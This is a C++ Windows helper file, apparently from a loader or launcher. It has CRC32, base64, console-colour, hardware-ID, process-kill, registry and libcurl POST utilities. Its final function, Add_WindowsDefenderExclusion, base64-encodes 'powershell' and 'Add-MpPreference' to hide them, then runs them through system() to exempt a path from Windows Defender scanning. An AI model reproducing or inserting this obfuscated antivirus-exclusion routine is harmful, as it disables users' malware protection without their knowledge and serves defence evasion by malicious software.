#define NOMINMAX
#include <iomanip>
#include <sstream>
#include <algorithm>
#include <windows.h>
#include <fstream>
#include <Wbemidl.h>
#include <comdef.h>
#include <windows.h>
#include <psapi.h>
#include <tchar.h> 
#include <curl/curl.h>

#pragma comment(lib, "wbemuuid.lib")
#define WIN32_LEAN_AND_MEAN

#pragma region CRC32
static uint32_t crc32_table[256];
static bool crc32_initialized = false;
void initialize_crc32_table() {
    const uint32_t polynomial = 0xEDB88320;
    for (uint32_t i = 0; i < 256; ++i) {
        uint32_t crc = i;
        for (uint32_t j = 8; j > 0; --j) {
            if (crc & 1)
                crc = (crc >> 1) ^ polynomial;
            else
                crc >>= 1;
        }
        crc32_table[i] = crc;
    }
}
uint32_t crc32(const std::string& data) {
    if (!crc32_initialized) {
        initialize_crc32_table();
        crc32_initialized = true;
    }
    uint32_t crc = 0xFFFFFFFF;
    for (char byte : data) {
        uint8_t table_index = static_cast<uint8_t>(crc ^ byte);
        crc = (crc >> 8) ^ crc32_table[table_index];
    }
    return crc ^ 0xFFFFFFFF;
}
std::string crc32ToHex(uint32_t crc) {
    std::stringstream ss;
    ss << std::hex << std::setw(8) << std::setfill('0') << crc;
    return ss.str();
}

#pragma endregion


void EnableANSIColors(bool value) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    DWORD dwMode = 0;
    if (GetConsoleMode(hConsole, &dwMode)) {
        if (value)
            dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
        else
            dwMode &= ~ENABLE_VIRTUAL_TERMINAL_PROCESSING;
        SetConsoleMode(hConsole, dwMode);
    }
}
void ClearLastLines(int num_lines) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD written;
    COORD coord = { 0, 0 };

    if (GetConsoleScreenBufferInfo(hConsole, &csbi)) {
        int currentY = csbi.dwCursorPosition.Y;
        int x = 0;
        int y = currentY - num_lines + 1;

        for (int i = 0; i < num_lines; ++i) {
            coord.Y = y + i;
            SetConsoleCursorPosition(hConsole, coord);
            FillConsoleOutputCharacter(hConsole, ' ', csbi.dwSize.X, coord, &written);
            FillConsoleOutputAttribute(hConsole, csbi.wAttributes, csbi.dwSize.X, coord, &written);
        }

        SetConsoleCursorPosition(hConsole, coord);  // Reset the cursor position
    }
}
void MoveCursorDown(int lines) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(hConsole, &csbi);

    COORD coord = { csbi.dwCursorPosition.X, csbi.dwCursorPosition.Y + lines };
    SetConsoleCursorPosition(hConsole, coord);
}

std::wstring stringToWString(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], size_needed);
    return wstr;
}

#include <string>
#include <random>
#include <sstream>
#include <iomanip>

std::string GetHWID() {
    std::string hwid;
    char volumeName[MAX_PATH + 1] = { 0 };
    char fileSystemName[MAX_PATH + 1] = { 0 };
    DWORD serialNumber = 0;
    DWORD maxComponentLen = 0;
    DWORD fileSystemFlags = 0;

    if (GetVolumeInformationA("C:\\", volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)))
        hwid = std::to_string(serialNumber);

    if (!hwid.empty()) {
        if (hwid.length() > 4)
            hwid = hwid.substr(0, 4);
    }
    else {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1000, 9999);
        hwid = std::to_string(dist(gen));
    }

    return hwid;
}
std::string to_upper(const std::string& str) {
    std::string result = str;
    std::transform(result.begin(), result.end(), result.begin(), ::toupper);
    return result;
}

std::string to_lower(const std::string& str) {
    std::string lower_str = str;
    std::transform(lower_str.begin(), lower_str.end(), lower_str.begin(), [](unsigned char c) {
        return std::tolower(c);
        });
    return lower_str;
}
std::string trimSpaces(const std::string& str) {
    std::string result;
    result.reserve(str.size()); // Reserve space to avoid multiple allocations

    for (char c : str) {
        if (!std::isspace(static_cast<unsigned char>(c))) {
            result += c;
        }
    }

    return result;
}

void HexToRGB(const std::string& hex, int& r, int& g, int& b) {
    std::stringstream ss;
    ss << std::hex << hex.substr(0, 2);
    ss >> r;
    ss.clear();
    ss << std::hex << hex.substr(2, 2);
    ss >> g;
    ss.clear();
    ss << std::hex << hex.substr(4, 2);
    ss >> b;
}
void BlendColor(int r1, int g1, int b1, int r2, int g2, int b2, float ratio, int& r, int& g, int& b) {
    r = static_cast<int>(r1 + ratio * (r2 - r1));
    g = static_cast<int>(g1 + ratio * (g2 - g1));
    b = static_cast<int>(b1 + ratio * (b2 - b1));
}
std::string Color_Text(const std::string& text, const std::string& hexFrom, const std::string& hexTo) {
    int r1, g1, b1, r2, g2, b2;
    HexToRGB(hexFrom, r1, g1, b1);
    HexToRGB(hexTo, r2, g2, b2);

    int length = 0;
    for (size_t i = 0; i < text.length(); ++i) {
        if ((text[i] & 0xC0) != 0x80) {
            ++length;
        }
    }

    std::string coloredText;
    int charIndex = 0;
    for (size_t i = 0; i < text.length();) {
        float ratio = static_cast<float>(charIndex) / static_cast<float>(length - 1);
        int r, g, b;
        BlendColor(r1, g1, b1, r2, g2, b2, ratio, r, g, b);

        std::stringstream ss;
        ss << "\033[38;2;" << r << ";" << g << ";" << b << "m";

        if ((text[i] & 0x80) == 0) {
            ss << text[i];
            ++i;
        }
        else if ((text[i] & 0xE0) == 0xC0) {
            ss << text[i] << text[i + 1];
            i += 2;
        }
        else if ((text[i] & 0xF0) == 0xE0) {
            ss << text[i] << text[i + 1] << text[i + 2];
            i += 3;
        }
        else if ((text[i] & 0xF8) == 0xF0) {
            ss << text[i] << text[i + 1] << text[i + 2] << text[i + 3];
            i += 4;
        }
        coloredText += ss.str();
        ++charIndex;
    }

    coloredText += "\033[0m";

    return coloredText;
}

std::string TCHARToString(const TCHAR* tcharStr) {
#ifdef _UNICODE
    // If compiled with Unicode, TCHAR is wchar_t, so convert to std::wstring first.
    std::wstring wstr(tcharStr);
    // Convert std::wstring to std::string (narrow string)
    std::string str(wstr.begin(), wstr.end());
    return str;
#else
    // If not Unicode, TCHAR is char, so direct conversion to std::string.
    return std::string(tcharStr);
#endif
}

bool IsProgramRunning(const std::string& programName) {
    DWORD process_ids[1024], bytes_returned;

    if (!EnumProcesses(process_ids, sizeof(process_ids), &bytes_returned)) {
        return false;
    }

    unsigned int process_count = bytes_returned / sizeof(DWORD);
    for (unsigned int i = 0; i < process_count; i++) {
        if (process_ids[i] != 0) {
            HANDLE process_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_ids[i]);

            if (process_handle) {
                TCHAR process_name[MAX_PATH] = TEXT("<unknown>");
                HMODULE module;
                DWORD bytes_needed;

                if (EnumProcessModules(process_handle, &module, sizeof(module), &bytes_needed)) {
                    GetModuleBaseName(process_handle, module, process_name, sizeof(process_name) / sizeof(TCHAR));
                }

                std::string proc_name = TCHARToString(process_name);
                if (proc_name == programName) {
                    CloseHandle(process_handle);
                    return true;
                }

                CloseHandle(process_handle);
            }
        }
    }

    return false;
}
DWORD WaitForExit(const std::string& programName, DWORD timeout_ms = INFINITE) {
    unsigned int elapsed_time = 0;
    const unsigned int sleep_duration = 100; 

    if (!IsProgramRunning(programName))
        return ERROR_SUCCESS;

    while (IsProgramRunning(programName)) {
        if (timeout_ms != INFINITE && elapsed_time >= timeout_ms)
            return WAIT_TIMEOUT;
        Sleep(sleep_duration);
        elapsed_time += sleep_duration;
    }

    return ERROR_SUCCESS;
}

void EndProcess(const std::string& programName) {
    DWORD process_ids[1024], bytes_returned;

    if (!EnumProcesses(process_ids, sizeof(process_ids), &bytes_returned)) {
        return;
    }

    unsigned int process_count = bytes_returned / sizeof(DWORD);
    for (unsigned int i = 0; i < process_count; i++) {
        if (process_ids[i] != 0) {
            HANDLE process_handle = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_ids[i]);

            if (process_handle) {
                TCHAR process_name[MAX_PATH] = TEXT("<unknown>");
                HMODULE module;
                DWORD bytes_needed;

                if (EnumProcessModules(process_handle, &module, sizeof(module), &bytes_needed)) {
                    GetModuleBaseName(process_handle, module, process_name, sizeof(process_name) / sizeof(TCHAR));
                }

                std::string proc_name = TCHARToString(process_name);
                if (proc_name == programName) {
                    TerminateProcess(process_handle, 0);
                }

                CloseHandle(process_handle);
            }
        }
    }
}

size_t CurlWriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    if (userp) {
        std::string* response_string = static_cast<std::string*>(userp);
        response_string->append(static_cast<char*>(contents), size * nmemb);
        return size * nmemb;
    }
    return 0;
}
std::string performHTTPRequest(const std::string& url, const std::string& requestBody) {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if (!curl) {
        return "";
    }

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, requestBody.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, requestBody.length());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        curl_easy_cleanup(curl);
        return "";
    }

    curl_easy_cleanup(curl);
    return readBuffer;
}
bool SetRegistryDwordValue(HKEY hKeyRoot, const std::string& subKey, const std::string& valueName, DWORD value)
{
    HKEY hKey;
    LONG result = RegOpenKeyExA(hKeyRoot, subKey.c_str(), 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegSetValueExA(hKey, valueName.c_str(), 0, REG_DWORD, reinterpret_cast<const BYTE*>(&value), sizeof(value));
    if (result != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(const std::string& input) {
    std::string output;
    int val = 0, valb = -6;
    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            output.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) output.push_back(base64_chars[((val << 8) >> valb) & 0x3F]);
    while (output.size() % 4) output.push_back('=');
    return output;
}

std::string base64_decode(const std::string& input) {
    std::string output;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;
    int val = 0, valb = -8;
    for (unsigned char c : input) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            output.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return output;
}
void Add_WindowsDefenderExclusion(const std::string& path) {
    std::string command = base64_decode("cG93ZXJzaGVsbA==") + " -NoLogo -NoProfile -NonInteractive -Command \"" + base64_decode("QWRkLU1wUHJlZmVyZW5jZQ==") + "-ExclusionPath '" + path + "'\"";
    system(command.c_str());
}